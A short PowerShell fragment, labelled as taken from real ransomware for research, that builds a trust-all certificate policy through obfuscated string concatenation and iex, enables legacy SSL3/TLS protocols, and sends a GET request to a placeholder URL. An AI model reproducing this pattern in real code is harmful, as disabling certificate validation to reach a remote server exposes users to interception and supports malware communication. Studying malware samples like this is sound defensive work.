// THIS CODE SAMPLE WAS TAKEN FROM REAL RANSOMWARE AND IS PROVIDED HERE ONLY FOR RESEARCH NEEDS !!!
// TO STOP RANSOMWARE WE NEED TO KNOW HOW IT WORKS INSIDE
// DON'T USE ANY OF THIS CODE SAMPLES FOR ANY CRIMINAL ACTIVITIES!

$str = 'add-type @"'+[char]10+'using System.Net;'+[char]10+'using System.Security.Cryptography.X509Certificates;'+[char]10+'public class TrustAllCertsPolicy : ICertificatePolicy {'+[char]10+'public bool CheckValidationResult('+[char]10+'ServicePoint srvPoint, X509Certificate certificate,'+[char]10+'WebRequest request, int certificateProblem) {'+[char]10+'return true;'+[char]10+'}}'+[char]10+'"@'+[char]10+'New-Object TrustAllCertsPolicy;';
[System.Net.ServicePointManager]::CertificatePolicy = New-Object (iex $str);
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3, [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12;
$Req = Invoke-WebRequest -Uri https://SOME-URL-HERE -Headers $Header -Method Get -ContentType "Application/Json";
